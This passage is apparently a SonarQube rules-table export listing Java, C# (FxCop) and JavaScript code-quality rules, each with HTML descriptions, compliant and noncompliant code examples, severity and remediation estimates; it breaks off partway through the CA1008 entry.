480	Maps with keys that are enum values should be replaced with EnumMap	S1640	S1640	squid	<p>\n  When all the keys of a Map are values from the same enum, the <code>Map</code> can be replaced with an <code>EnumMap</code>,\n  which can be much more efficient than other sets because the underlying data structure is a simple array.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyClass {\n\n  public enum COLOR {\n    RED, GREEN, BLUE, ORANGE;\n  }\n\n  public void mapMood() {\n    Map&lt;COLOR, String&gt; moodMap = new HashMap&lt;COLOR, String&gt; ();\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic class MyClass {\n\n  public enum COLOR {\n    RED, GREEN, BLUE, ORANGE;\n  }\n\n  public void mapMood() {\n    EnumMap&lt;COLOR, String&gt; moodMap = new EnumMap&lt;COLOR, String&gt; (COLOR.class);\n  }\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	performance	f	HTML	1511453806996	1511453806997	1
481	Inner classes should not have too many lines	S2972	S2972	squid	<p>\n  Inner classes should be short and sweet, to manage complexity in the overall file.\n  An inner class that has grown longer than a certain threshold should probably be externalized to its own file.\n</p>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	brain-overload	f	HTML	1511453806997	1511453806997	1
482	String function use should be optimized for single characters	S3027	S3027	squid	<p>An <code>indexOf</code> or <code>lastIndexOf</code> call with a single letter <code>String</code> can be made more performant by switching to a call with a <code>char</code> argument.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nString myStr = "Hello World";\n// ...\nint pos = myStr.indexOf("W");  // Noncompliant\n// ...\nint otherPos = myStr.lastIndexOf("r"); // Noncompliant\n// ...\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nString myStr = "Hello World";\n// ...\nint pos = myStr.indexOf('W'); \n// ...\nint otherPos = myStr.lastIndexOf('r');\n// ...\n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	clumsy,performance	f	HTML	1511453807001	1511453807001	1
483	Sets with elements that are enum values should be replaced with EnumSet	S1641	S1641	squid	<p>When all the elements in a Set are values from the same enum, the Set can be replaced with an EnumSet, which can be much more efficient than other sets because the underlying data structure is a simple bitmap.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyClass {\n  \n  public enum COLOR {\n    RED, GREEN, BLUE, ORANGE;\n  }\n\n  public void doSomething() {\n    Set&lt;COLOR&gt; warm = new HashSet&lt;COLOR&gt;();\n    warm.add(COLORS.RED);\n    warm.add(COLORS.ORANGE);\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic class MyClass {\n  \n  public enum COLOR {\n    RED, GREEN, BLUE, ORANGE;\n  }\n\n  public void doSomething() {\n    EnumSet&lt;COLOR&gt; warm = EnumSet.of(COLOR.RED, COLOR.ORANGE);\n  }\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	performance	f	HTML	1511453807002	1511453807002	1
299	CA1802: Use Literals Where Appropriate	UseLiteralsWhereAppropriate	CA1802	fxcop	<h2>Cause</h2>\n<p>\n            A field is declared <code>static</code> and <code>readonly</code> (<code>Shared</code> and <code>ReadOnly</code> in Visual Basic), and is initialized with a value that is computable at compile time.\n</p>\n<h2>Rule Description</h2>\n<p>\n            The value of a <code>static</code> <code>readonly</code> field is computed at runtime when the static constructor for the declaring type is called. If the <code>static</code> <code>readonly</code> field is initialized when it is declared and a static constructor is not declared explicitly, the compiler emits a static constructor to initialize the field.\n            The value of a <code>const</code> field is computed at compile time and stored in the metadata, which increases runtime performance when it is compared to a <code>static</code> <code>readonly</code> field.\n            Because the value assigned to the targeted field is computable at compile time, change the declaration to a <code>const</code> field so that the value is computed at compile time instead of at runtime.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, replace the <code>static</code> and <code>readonly</code> modifiers with the <code>const</code> modifier.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule, or disable the rule, if performance is not of concern.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182280.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182280.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806728	1511453806728	1
300	CA1411: COM registration methods should not be visible	ComRegistrationMethodsShouldNotBeVisible	CA1411	fxcop	<h2>Cause</h2>\n<p>\n            A method that is marked with the <code>System.Runtime.InteropServices.ComRegisterFunctionAttribute</code> or the <code>System.Runtime.InteropServices.ComUnregisterFunctionAttribute</code> attribute is externally visible.\n</p>\n<h2>Rule Description</h2>\n<p>\n            When an assembly is registered with Component Object Model (COM), entries are added to the registry for each COM-visible type in the assembly. Methods that are marked with the <code>ComRegisterFunctionAttribute</code> and <code>ComUnregisterFunctionAttribute</code> attributes are called during the registration and unregistration processes, respectively, to run user code that is specific to the registration/unregistration of these types. This code should not be called outside these processes.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, change the accessibility of the method to <code>private</code> or <code>internal</code> (<code>Friend</code> in Visual Basic).\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:ComRegistrationMethodsShouldBeMatched}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182201.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182201.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806729	1511453806730	1
301	CA1708: Identifiers should differ by more than case	IdentifiersShouldDifferByMoreThanCase	CA1708	fxcop	<h2>Cause</h2>\n<p>\n            The names of two types, members, parameters, or fully qualified namespaces are identical when they are converted to lowercase.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Identifiers for namespaces, types, members, and parameters cannot differ only by case because languages that target the common language runtime are not required to be case-sensitive. For example, Visual Basic is a widely used case-insensitive language.\n            This rule fires on publicly visible members only.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            Select a name that is unique when it is compared to other identifiers in a case-insensitive manner.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule. The library might not be usable in all available languages in the .NET Framework.\n</p>\n<h2>Example of a Violation</h2>\n<p>\n            The following example demonstrates a violation of this rule.\n\n\n\n\n\n\n\n\n\n\n            <pre>\nusing System;\nnamespace NamingLibrary\n{\n    public class Class1\t// IdentifiersShouldDifferByMoreThanCase\n    {\n        protected string someProperty;\n\n        public string SomeProperty\n        {\n            get { return someProperty; }\n        }\n    }\n}\n</pre>\n\n\n\n\n\n</p>\n<h2>Related Rules</h2>\n<p>\n\n\n                {rule:fxcop:IdentifiersShouldBeCasedCorrectly}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182242.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182242.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	5min	\N	\N	\N	\N	\N	f	HTML	1511453806731	1511453806731	1
302	CA1501: Avoid excessive inheritance	AvoidExcessiveInheritance	CA1501	fxcop	<h2>Cause</h2>\n<p>\n            A type is more than four levels deep in its inheritance hierarchy.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Deeply nested type hierarchies can be difficult to follow, understand, and maintain. This rule limits analysis to hierarchies in the same module.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, derive the type from a base type that is less deep in the inheritance hierarchy or eliminate some of the intermediate base types.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule. However, the code might be more difficult to maintain. Note that, depending on the visibility of base types, resolving violations of this rule might create breaking changes. For example, removing public base types is a breaking change.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182213.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182213.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	30min	\N	\N	\N	\N	\N	f	HTML	1511453806733	1511453806733	1
303	CA1064: Exceptions should be public	ExceptionsShouldBePublic	CA1064	fxcop	<h2>Cause</h2>\n<p>\n            A non-public exception derives directly from <code>Exception</code>, <code>SystemException</code>, or <code>ApplicationException</code>.\n</p>\n<h2>Rule Description</h2>\n<p>\n            An internal exception is only visible inside its own internal scope. After the exception falls outside the internal scope, only the base exception can be used to catch the exception. If the internal exception is inherited from <code>Exception</code>, <code>SystemException</code>, or <code>ApplicationException</code>, the external code will not have sufficient information to know what to do with the exception.\n            But, if the code has a public exception that later is used as the base for a internal exception, it is reasonable to assume the code further out will be able to do something intelligent with the base exception. The public exception will have more information than what is provided by T:System.Exception, T:System.SystemException, or T:System.ApplicationException.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            Make the exception public, or derive the internal exception from a public exception that is not <code>Exception</code>, <code>SystemException</code>, or <code>ApplicationException</code>.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Suppress a message from this rule if you are sure in all cases that the private exception will be caught within its own internal scope.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/bb264484.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb264484.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	1h	\N	\N	\N	\N	\N	f	HTML	1511453806734	1511453806734	1
304	CA1712: Do not prefix enum values with type name	DoNotPrefixEnumValuesWithTypeName	CA1712	fxcop	<h2>Cause</h2>\n<p>\n            An enumeration contains a member whose name starts with the type name of the enumeration.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Names of enumeration members are not prefixed with the type name because type information is expected to be provided by development tools.\n            Naming conventions provide a common look for libraries that target the common language runtime. This reduces the time that is required for to learn a new software library, and increases customer confidence that the library was developed by someone who has expertise in developing managed code.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, remove the type name prefix from the enumeration member.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:IdentifiersShouldNotHaveIncorrectSuffix}<br/>\n\n\n\n\n                {rule:fxcop:MarkEnumsWithFlags}<br/>\n\n\n\n\n                {rule:fxcop:DoNotMarkEnumsWithFlags}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182237.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182237.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	5min	\N	\N	\N	\N	\N	f	HTML	1511453806735	1511453806735	1
305	CA1408: Do not use AutoDual ClassInterfaceType	DoNotUseAutoDualClassInterfaceType	CA1408	fxcop	<h2>Cause</h2>\n<p>\n            A Component Object Model (COM) visible type is marked with the <code>ClassInterfaceAttribute</code> attribute set to the <code>AutoDual</code> value of <code>ClassInterfaceType</code>.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Types that use a dual interface enable clients to bind to a specific interface layout. Any changes in a future version to the layout of the type or any base types will break COM clients that bind to the interface. By default, if the <code>ClassInterfaceAttribute</code> attribute is not specified, a dispatch-only interface is used.\n            Unless marked otherwise, all public nongeneric types are visible to COM; all nonpublic and generic types are invisible to COM.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, change the value of the <code>ClassInterfaceAttribute</code> attribute to the <code>None</code> value of <code>ClassInterfaceType</code> and explicitly define the interface.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule unless it is certain that the layout of the type and its base types will not change in a future version.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:AutoLayoutTypesShouldNotBeComVisible}<br/>\n\n\n\n\n                {rule:fxcop:MarkComSourceInterfacesAsIDispatch}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182205.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182205.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806737	1511453806737	1
306	CA1801: Review unused parameters	ReviewUnusedParameters	CA1801	fxcop	<h2>Cause</h2>\n<p>\n            A method signature includes a parameter that is not used in the method body. This rule does not examine the following methods:\n            <ul>\n              <li>\n                Methods referenced by a delegate.\n              </li>\n              <li>\n                Methods used as event handlers.\n              </li>\n              <li>\n                Methods declared with the <code>abstract</code> (<code>MustOverride</code> in Visual Basic) modifier.\n              </li>\n              <li>\n                Methods declared with the <code>virtual</code> (<code>Overridable</code> in Visual Basic) modifier.\n              </li>\n              <li>\n                Methods declared with the <code>override</code> (<code>Overrides</code> in Visual Basic) modifier.\n              </li>\n              <li>\n                Methods declared with the <code>extern</code> (<code>Declare</code> statement in Visual Basic) modifier.\n              </li>\n            </ul>\n</p>\n<h2>Rule Description</h2>\n<p>\n            Review parameters in non-virtual methods that are not used in the method body to make sure no correctness exists around failure to access them. Unused parameters incur maintenance and performance costs.\n            Sometimes a violation of this rule can point to an implementation bug in the method. For example, the parameter should have been used in the method body. Suppress warnings of this rule if the parameter has to exist because of backward compatibility.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, remove the unused parameter (a breaking change) or use the parameter in the method body (a non-breaking change).\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule for previously shipped code for which the fix would be a breaking change.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:AvoidUncalledPrivateCode}<br/>\n\n\n\n\n                {rule:fxcop:AvoidUninstantiatedInternalClasses}<br/>\n\n\n\n\n                {rule:fxcop:RemoveUnusedLocals}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182268.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182268.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806738	1511453806738	1
819	Statements should be on separate lines	OneStatementPerLine	\N	javascript	<p>For better readability, do not put more than one statement on a single line.</p>\n\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nif(someCondition) doSomething();\n</pre>\n\n<h2>Compliant Solution</h2>\n\n<pre>\nif(someCondition) {\n  doSomething();\n}\n</pre>\n\n<h2>Exceptions</h2>\n\n<p>Anonymous functions containing a single statement are ignored.</p>\n\n<pre>\nonEvent(function() { doSomething(); });               // Compliant\nonEvent(function(p) { doSomething(); return p %2 ;}); // Noncompliant\n</pre>	1	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	1min	\N	\N	convention	f	HTML	1511453807425	1511453807426	1
820	"delete" should be used only with object properties	S3001	\N	javascript	<p>The semantics of the <code>delete</code> operator are a bit tricky, and it can only be reliably used to remove properties from objects. Pass anything else to it, and you may or may not get the desired result.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nvar x  = 1;\ndelete x;       // Noncompliant\n\nfunction foo(){\n..\n}\n\ndelete foo;  // Noncompliant\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nvar obj = {\n  x:1,\n  foo: function(){\n  ...\n  }\n};\ndelete obj.x;\ndelete obj.foo;\n\n</pre>	3	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	\N	f	HTML	1511453807427	1511453807427	2
307	CA1816: Call GC.SuppressFinalize correctly	CallGCSuppressFinalizeCorrectly	CA1816	fxcop	<h2>Cause</h2>\n<p>\n            <ul>\n              <li>\n                A method that is an implementation of <code>IDisposable.Dispose</code> does not call <code>GC.SuppressFinalize</code>.\n              </li>\n              <li>\n                A method that is not an implementation of <code>IDisposable.Dispose</code> calls <code>GC.SuppressFinalize</code>.\n              </li>\n              <li>\n                A method calls <code>GC.SuppressFinalize</code> and passes something other than this (Me in Visual Basic).\n              </li>\n            </ul>\n</p>\n<h2>Rule Description</h2>\n<p>\n            The <code>IDisposable.Dispose</code> method lets users release resources at any time before the object becoming available for garbage collection. If the <code>IDisposable.Dispose</code> method is called, it frees resources of the object. This makes finalization unnecessary. <code>IDisposable.Dispose</code> should call <code>GC.SuppressFinalize</code> so the garbage collector does not call the finalizer of the object.\n             \n            To prevent derived types with finalizers from having to re-implement [System.IDisposable] and to call it, unsealed types without finalizers should still call <code>GC.SuppressFinalize</code>.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule:\n            If the method is an implementation of <code>Dispose</code>, add a call to <code>GC.SuppressFinalize</code>.\n            If the method is not an implementation of <code>Dispose</code>, either remove the call to <code>GC.SuppressFinalize</code> or move it to the type's <code>Dispose</code> implementation.\n            Change all calls to <code>GC.SuppressFinalize</code> to pass this (Me in Visual Basic).\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Only suppress a warning from this rule if you are deliberating using <code>GC.SuppressFinalize</code> to control the lifetime of other objects. Do not suppress a warning from this rule if an implementation of <code>Dispose</code> does not call <code>GC.SuppressFinalize</code>. In this situation, failing to suppress finalization degrades performance and provide no benefits.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:DisposeMethodsShouldCallBaseClassDispose}<br/>\n\n\n\n\n                {rule:fxcop:DisposableTypesShouldDeclareFinalizer}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182269.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182269.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806739	1511453806740	1
308	CA1404: Call GetLastError immediately after P/Invoke	CallGetLastErrorImmediatelyAfterPInvoke	CA1404	fxcop	<h2>Cause</h2>\n<p>\n            A call is made to the Marshal.GetLastWin32Error method or the equivalent Win32 <code>GetLastError</code> function, and the call that comes immediately before is not to a platform invoke method.\n</p>\n<h2>Rule Description</h2>\n<p>\n            A platform invoke method accesses unmanaged code and is defined by using the <code>Declare</code> keyword in Visual Basic or the <code>System.Runtime.InteropServices.DllImportAttribute</code> attribute. Generally, upon failure, unmanaged functions call the Win32 <code>SetLastError</code> function to set an error code that is associated with the failure. The caller of the failed function calls the Win32 <code>GetLastError</code> function to retrieve the error code and determine the cause of the failure. The error code is maintained on a per-thread basis and is overwritten by the next call to <code>SetLastError</code>. After a call to a failed platform invoke method, managed code can retrieve the error code by calling the GetLastWin32Error method. Because the error code can be overwritten by internal calls from other managed class library methods, the <code>GetLastError</code> or GetLastWin32Error method should be called immediately after the platform invoke method call.\n            The rule ignores calls to the following managed members when they occur between the call to the platform invoke method and the call to GetLastWin32Error. These members do not change the error code and are useful for determining the success of some platform invoke method calls.\n            <ul>\n              <li>\n\n\n                    <code>IntPtr.Zero</code>\n\n\n              </li>\n              <li>\n\n\n                    IntPtr.Equality\n\n\n              </li>\n              <li>\n\n\n                    IntPtr.Inequality\n\n\n              </li>\n              <li>\n\n\n                    <code>SafeHandle.IsInvalid</code>\n\n\n              </li>\n            </ul>\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, move the call to GetLastWin32Error so that it immediately follows the call to the platform invoke method.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule if the code between the platform invoke method call and the GetLastWin32Error method call cannot explicitly or implicitly cause the error code to change.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:MovePInvokesToNativeMethodsClass}<br/>\n\n\n\n\n                {rule:fxcop:PInvokeEntryPointsShouldExist}<br/>\n\n\n\n\n                {rule:fxcop:PInvokesShouldNotBeVisible}<br/>\n\n\n\n\n                {rule:fxcop:SpecifyMarshalingForPInvokeStringArguments}<br/>\n\n\n\n\n                {rule:fxcop:UseManagedEquivalentsOfWin32Api}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182199.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182199.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806741	1511453806742	1
309	CA2101: Specify marshaling for P/Invoke string arguments	SpecifyMarshalingForPInvokeStringArguments	CA2101	fxcop	<h2>Cause</h2>\n<p>\n            A platform invoke member allows for partially trusted callers, has a string parameter, and does not explicitly marshal the string.\n</p>\n<h2>Rule Description</h2>\n<p>\n            When you convert from Unicode to ANSI, it is possible that not all Unicode characters can be represented in a specific ANSI code page. Best-fit mapping tries to solve this problem by substituting a character for the character that cannot be represented. The use of this feature can cause a potential security vulnerability because you cannot control the character that is chosen. For example, malicious code could intentionally create a Unicode string that contains characters that are not found in a particular code page, which are converted to file system special characters such as '..' or '/'. Note also that security checks for special characters frequently occur before the string is converted to ANSI.\n            Best-fit mapping is the default for the unmanaged conversion, WChar to MByte. Unless you explicitly disable best-fit mapping, your code might contain an exploitable security vulnerability because of this issue.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, explicitly marshal string data types.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182319.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182319.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806742	1511453806742	1
310	CA2106: Secure asserts	SecureAsserts	CA2106	fxcop	<h2>Cause</h2>\n<p>\n            A method asserts a permission and no security checks are performed on the caller.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Asserting a security permission without performing any security checks can leave an exploitable security weakness in your code. A security stack walk stops when a security permission is asserted. If you assert a permission without performing any checks on the caller, the caller could indirectly execute code by using your permissions. Asserts without security checks are permissible only when you are sure that the assert cannot be used in a harmful manner. An assert is harmless if the code you call is harmless, or users cannot pass arbitrary information to code that you call.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, add a security demand to the method or its declaring type.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Suppress a warning from this rule only after a careful security review.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182314.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182314.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806744	1511453806744	1
311	CA1502: Avoid excessive complexity	AvoidExcessiveComplexity	CA1502	fxcop	<h2>Cause</h2>\n<p>\n            A method has an excessive cyclomatic complexity.\n</p>\n<h2>Rule Description</h2>\n<p>\n\n              Cyclomatic complexity measures the number of linearly independent paths through the method, which is determined by the number and complexity of conditional branches. A low cyclomatic complexity generally indicates a method that is easy to understand, test, and maintain. The cyclomatic complexity is calculated from a control flow graph of the method and is given as follows:\n            cyclomatic complexity = the number of edges - the number of nodes + 1\n            where a node represents a logic branch point and an edge represents a line between nodes.\n            The rule reports a violation when the cyclomatic complexity is more than 25.\n            You can learn more about code metrics at Measuring Complexity and Maintainability of Managed Code,\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, refactor the method to reduce its cyclomatic complexity.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule if the complexity cannot easily be reduced and the method is easy to understand, test, and maintain. In particular, a method that contains a large <code>switch</code> (<code>Select</code> in Visual Basic) statement is a candidate for exclusion. The risk of destabilizing the code base late in the development cycle or introducing an unexpected change in runtime behavior in previously shipped code might outweigh the maintainability benefits of refactoring the code.\n</p>\n<h2>How Cyclomatic Complexity is Calculated</h2>\n<p>\n            The cyclomatic complexity is calculated by adding 1 to the following:\n            <ul>\n              <li>\n                Number of branches (such as <code>if</code>, <code>while</code>, and <code>do</code>)\n              </li>\n              <li>\n                Number of <code>case</code> statements in a <code>switch</code>\n              </li>\n            </ul>\n            The following examples show methods that have varying cyclomatic complexities.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:AvoidExcessiveInheritance}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182212.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182212.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	30min	\N	\N	\N	\N	\N	f	HTML	1511453806744	1511453806745	1
312	CA1409: Com visible types should be creatable	ComVisibleTypesShouldBeCreatable	CA1409	fxcop	<h2>Cause</h2>\n<p>\n            A reference type that is specifically marked as visible to Component Object Model (COM) contains a public parameterized constructor but does not contain a public default (parameterless) constructor.\n</p>\n<h2>Rule Description</h2>\n<p>\n            A type without a public default constructor cannot be created by COM clients. However, the type can still be accessed by COM clients if another means is available to create the type and pass it to the client (for example, through the return value of a method call).\n            The rule ignores types that are derived from <code>System.Delegate</code>.\n            By default, the following are visible to COM: assemblies, public types, public instance members in public types, and all members of public value types.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, add a public default constructor or remove the <code>System.Runtime.InteropServices.ComVisibleAttribute</code> from the type.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule if other ways are provided to create and pass the object to the COM client.\n</p>\n<h2>Related Rules</h2>\n<p>\n\n\n                {rule:fxcop:MarkAssembliesWithComVisible}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182203.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182203.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806745	1511453806746	1
313	CA2140: Transparent code must not reference security critical items	TransparentMethodsMustNotReferenceCriticalCode	CA2140	fxcop	<h2>Cause</h2>\n<p>\n            A transparent method:\n            <ul>\n              <li>\n                handles a security critical security exception type\n              </li>\n              <li>\n                has a parameter that is marked as a security critical type\n              </li>\n              <li>\n                has a generic parameter with a security critical constraints\n              </li>\n              <li>\n                has a local variable of a security critical type\n              </li>\n              <li>\n                references a type that is marked as security critical\n              </li>\n              <li>\n                calls a method that is marked as security critical\n              </li>\n              <li>\n                references a field that is marked as security critical\n              </li>\n              <li>\n                returns a type that is marked as security critical\n              </li>\n            </ul>\n</p>\n<h2>Rule Description</h2>\n<p>\n            A code element that is marked with the <code>SecurityCriticalAttribute</code>  attribute is security critical. A transparent method cannot use a security critical element. If a transparent type attempts to use a security critical type a <code>TypeAccessException</code>, <code>MethodAccessException</code> , or <code>FieldAccessException</code> is raised.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, do one of the following:\n            <ul>\n              <li>\n                Mark the code element that uses the security critical code with the <code>SecurityCriticalAttribute</code> attribute\n                - or -\n              </li>\n              <li>\n                Remove the <code>SecurityCriticalAttribute</code> attribute from the code elements that are marked as security critical and instead mark them with the <code>SecuritySafeCriticalAttribute</code> or <code>SecurityTransparentAttribute</code> attribute.\n              </li>\n            </ul>\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/bb264475.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb264475.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806747	1511453806747	1
314	CA1008: Enums should have zero value	EnumsShouldHaveZeroValue	CA1008	fxcop	<h2>Cause</h2>\n<p>\n            An enumeration without an applied <code>System.FlagsAttribute</code> does not define a member that has a value of zero; or an enumeration that has an applied <code>FlagsAttribute</code> defines a member that has a value of zero but its name is not 'None', or the enumeration defines multiple zero-valued members.\n</p>\n<h2>Rule Description</h2>\n<p>\n            The default value of an uninitialized enumeration, just like other value types, is zero. A non-flags−attributed enumeration should define a member that has the value of zero so that the default value is a valid value of the enumeration. If appropriate, name the member 'None'. Otherwise, assign zero to the most frequently used member. Note that, by default, if the value of the first enumeration member is not set in the declaration, its value is zero.\n            If an enumeration that has the <code>FlagsAttribute</code> applied defines a zero-valued member, its name should be 'None' to indicate that no values have been set in the enumeration. Using a zero-valued member for any other purpose is contrary to the use of the <code>FlagsAttribute</code> in that the AND and OR bitwise operators are useless with the member. This implies that only one member should be assigned the value zero. Note that if multiple members that have the value zero occur in a flags-attributed enumeration, Enum.ToString() returns incorrect results for members that are not zero.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule for non-flags−attributed enumerations, define a member that has the value of zero; this is a non-breaking change. For flags-attributed enumerations that define a zero-valued member, name this member 'None' and delete any other members that have a value of zero; this is a breaking change.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule except for flags-attributed enumerations that have previously shipped.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                